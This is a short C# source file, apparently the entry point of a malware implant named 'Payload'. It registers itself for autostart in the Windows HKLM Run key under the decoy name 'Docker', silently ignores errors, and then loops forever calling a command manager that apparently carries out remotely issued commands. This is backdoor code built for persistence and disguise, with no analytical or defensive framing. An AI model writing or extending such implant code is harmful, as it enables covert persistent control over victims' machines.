using Microsoft.Win32;
using Payload.Common;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Payload
{
    internal class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string runKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                string fullName = Config.Instance.WorkSpaceDir + "\\" + Config.Instance.ExeName;
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(runKey, true))
                {

                    key.SetValue("Docker", fullName);
                }
            }
            catch
            {

            }
            

            while (true)
            {
                Command.CommandManager.Instance.Run();
                Thread.Sleep(Config.Instance.MainSleepInterval);
            }
        }
    }
}
